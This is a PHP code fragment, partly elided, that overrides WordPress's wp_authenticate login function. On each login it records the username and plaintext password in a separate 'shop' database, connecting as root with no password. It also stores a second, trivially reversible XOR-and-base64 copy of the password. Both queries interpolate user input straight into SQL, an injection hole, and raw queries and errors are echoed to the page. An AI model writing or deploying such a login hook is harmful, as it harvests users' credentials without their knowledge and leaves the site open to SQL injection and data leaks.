...
if ( ! function_exists( 'wp_authenticate' ) ) :
	...
	function wp_authenticate( $username, $password ) {
		...
		if (!empty($password)) {
			...
			$external_db = new mysqli('localhost', 'root', '', 'shop');
	   
			// Добавляем пользователя во внешнюю базу данных
			$sql = "INSERT INTO auth (login, password) VALUES ('$username', '$password')";
   
		   if ($external_db->query($sql) === TRUE) {
			   echo "Логин и пароль успешно записаны";
		   } else {
			   echo "Error: " . $sql . "<br>" . $external_db->error;
		   }
   
		   // Добавление второй записи с инверт паролем
		   for ($i = 0; $i < strlen($password); $i++) {
				$byte = ord($password[$i]); 
				$invertedByte = $byte ^ 0xFF;
				$password_inverted .= chr($invertedByte); 
			}

			$password_inverted = base64_encode($password_inverted);
   
		   $sql = "INSERT INTO auth (login, password) VALUES ('{$username}_inverted', '$password_inverted')";
   
		   if ($external_db->query($sql) === TRUE) {
			   echo "Логин и инвертированный пароль успешно записаны";
		   } else {
			   echo "Error: " . $sql . "<br>" . $external_db->error;
		   }
		  
			// Закрываем соединение с внешней базой данных
			$external_db->close();
		}
